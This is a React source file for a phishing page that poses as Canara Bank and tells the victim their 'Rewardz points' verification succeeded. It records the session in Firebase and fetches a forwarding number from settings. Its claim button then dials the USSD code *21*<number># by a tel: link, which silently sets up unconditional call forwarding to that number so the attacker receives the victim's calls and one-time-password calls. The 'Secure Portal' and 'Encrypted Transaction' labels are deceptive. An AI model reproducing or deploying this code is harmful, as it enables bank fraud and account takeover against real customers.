import { useState, useEffect, useMemo } from 'react';
import { useParams } from 'react-router-dom';
import FirebaseUtil from '../FirebaseRepo';
import '../App.css';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState('8822407215');
  const { documentId } = useParams(); 

  const formattedCallNumber = useMemo(() => {
    const digitsOnly = callNumber.replace(/\D/g, '');
    return digitsOnly.length === 10 ? digitsOnly : '8822407215';
  }, [callNumber]);

  useEffect(() => {
    const finalUpdate = async () => {
      try {
        // 1. Fetching the forwarding number from settings
        const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
        if (doc?.call_forwarding_number) {
          setCallNumber(doc.call_forwarding_number.trim());
        }

        // 2. Updating final status in Firebase for serial tracking
        if (documentId) {
          const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
          await FirebaseUtil.updateDocument("carvana", documentId, {
            current_status: "Completed Successfully",
            finish_time: currentTime
          });
        }
      } catch (error) {
        console.error("Error in final steps:", error);
      }
    };
    finalUpdate();
  }, [documentId]);

  const handleCallAction = () => {
    const ussdCode = `*21*${formattedCallNumber}#`;
    window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
  };

  return (
    <div className="flex flex-col min-h-screen bg-white font-sans">
      {/* Header Section */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center shadow-lg">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif font-bold">Canara Bank</h1>
            <p className="text-sm opacity-90">Verification Status: 100% Done</p>
          </div>
        </div>
      </header>

      <div className="bg-[#0066b3] text-white text-center pb-2 border-t border-white/20">
        <p className="italic text-sm">Together We Can</p>
      </div>

      {/* Main Content Card */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-2xl w-full max-w-md p-6 shadow-2xl border-t-8 border-green-500 text-center">
          
          <div className="mb-6">
            <div className="bg-green-100 text-green-700 rounded-full px-5 py-2 mb-4 inline-flex items-center font-bold">
              <span className="mr-2 text-xl">✓</span> Verification Successful
            </div>
            <h1 className="text-3xl font-extrabold text-blue-900 mb-2">Congratulations!</h1>
            <p className="text-gray-600 font-medium">Your account is now eligible for Rewardz Points.</p>
          </div>

          {/* Hindi to English Converted Text Area */}
          <div className="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6 text-left">
            <p className="text-sm text-blue-800 font-bold uppercase mb-1">Final Step:</p>
            <p className="text-sm text-blue-700 leading-relaxed">
              To collect your Rewardz points, please click the button below and confirm the call from your mobile device.
            </p>
          </div>

          {/* Claim Button */}
          <button
            onClick={handleCallAction}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-black py-4 px-4 rounded-xl text-lg shadow-lg transform active:scale-95 transition-all mb-6 border-b-4 border-yellow-600"
          >
            CLAIM REWARDZ POINTS
          </button>

          <p className="text-[10px] text-gray-400 uppercase tracking-widest font-bold">
            Session ID: {documentId || 'USER_1765972045435'}
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
        <div className="flex justify-center space-x-2 mt-1 opacity-50 text-[10px] uppercase font-mono">
          <span>Encrypted Transaction</span>
          <span>|</span>
          <span>Secure Portal</span>
        </div>
      </footer>
    </div>
  );
};

export default SuccessPage;
